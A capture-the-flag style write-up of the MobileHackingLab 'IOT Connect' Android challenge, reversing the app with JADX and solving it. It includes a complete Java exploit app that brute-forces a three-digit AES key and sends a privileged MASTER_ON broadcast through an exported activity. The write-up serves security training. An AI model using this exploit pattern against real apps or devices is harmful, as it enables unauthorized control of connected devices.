---
layout: post
title: "IOT Connect Lab Solution - MobileHackingLab"
summary: "Reverse engineered Android app with JADX finding exported LoginActivity, analyzed dynamically created Broadcast Receiver expecting MASTER_ON action with AES-encrypted key parameter, brute-forced 3-digit PIN (000-999) to find correct decryption key, started LoginActivity intent, sent MASTER_ON broadcast with correct PIN."
---

## IOT Connect Lab Solution - MobileHackingLab

### Objective

Exploit a Broadcast Receiver Vulnerability: Your mission is to manipulate the broadcast receiver functionality in the "IOT Connect" Android application, allowing you to activate the master switch and control all connected devices. The challenge is to send a broadcast in a way that is not achievable by guest users.

---------
### Solution

#### 1. Checking AndroidManifest.xml

After reverse engineering with JADX and checking AndroidManifest.xml we can see that there is an exported receiver and main activity.

![0](https://github.com/user-attachments/assets/073904c6-7c0d-4ad6-9ea1-5bb60d4ffcf7)


#### 2. Checking Receiver

Receiver class is not implemented, instead it is dynamically created inside code as seen in the image. So we should find where this function is called.

![1](https://github.com/user-attachments/assets/33e7c935-bc5b-403a-bc46-16a3ebc8aeb0)



#### 3. Find where initialize function is called

I have found that inside LoginActivity.onCreate (which is Main activity and exported) this function is called. So we first have to create an intent to start this activity then send broadcast.

![2](https://github.com/user-attachments/assets/b839f28d-798c-4253-81fc-85268277849b)



#### 4. Analyzing receiver function

Well Let's comeback to our screenshot at 2nd part.

![1](https://github.com/user-attachments/assets/239f2102-8480-42f3-8e9d-ea1443dc5600)

Checking the function we can see that it expects action "MASTER_ON" and also an integer key value which is then used inside Checker.INSTANCE.check_key(key), let' s check that function



#### 5. Analyzing Checker.INSTANCE.check_key

Analyzing that function, we can see that it decrypts a DS string with AES algorithm and given key. This decryption should result with a string "master_on".

![4](https://github.com/user-attachments/assets/540c8300-b981-4f01-966e-d25cd15afdaf)



#### 6. Checking PIN

Checking the PIN function we can see that it expects 3 digit PIN value.

![5](https://github.com/user-attachments/assets/0ffa6d35-515d-4453-a017-4c1db08495ac)



#### 7. Create a script to exploit

After analyzing everthing I created a script that uses 3 digit (000-999) PIN values to decrypt DS string and if decryption results with string "master_on", LoginActivity is started then Broadcast is sent with MASTER_ON action.

```java
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import android.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;



public class MainActivity extends AppCompatActivity {
    TextView mainText;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Button button = findViewById(R.id.mainButton);

        mainText = findViewById(R.id.mainText);
        mainText.setText("The Flag is Below \n");
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bruteForce();
            }
        });
    }


    private static final String ALGORITHM = "AES";
    private static final String DS = "OSnaALIWUkpOziVAMycaZQ==";
    private static final String EXPECTED_PLAINTEXT = "master_on"; 

    public void bruteForce() {
        for (int pin = 0; pin <= 999; pin++) {
            String pinStr = String.format("%03d", pin);
            try {
                String decryptedText = decrypt(DS, pinStr);
                if (EXPECTED_PLAINTEXT.equals(decryptedText)) {
                    Log.d("FOUND PIN", "Correct PIN: " + pinStr);

                    Intent intent = new Intent();
                    intent.setClassName("com.mobilehackinglab.iotconnect","com.mobilehackinglab.iotconnect.LoginActivity");
                    intent.setAction("android.intent.action.MAIN");
                    intent.addCategory("android.intent.category.LAUNCHER");
                    startActivity(intent);

                    Intent receiver = new Intent();
                    receiver.setAction("MASTER_ON");
                    receiver.putExtra("key", pin);
                    sendBroadcast(receiver);
                    break;
                }
            } catch (Exception ignored) {}
        }
    }

    public static String decrypt(String ds2, String key) throws Exception {
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(ALGORITHM + "/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        byte[] decodedBytes = Base64.decode(ds2, Base64.DEFAULT);
        byte[] decryptedBytes = cipher.doFinal(decodedBytes);
        return new String(decryptedBytes, "UTF-8").trim();
    }

    private static SecretKeySpec generateKey(String staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = staticKey.getBytes();
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, ALGORITHM);
    }
}
```
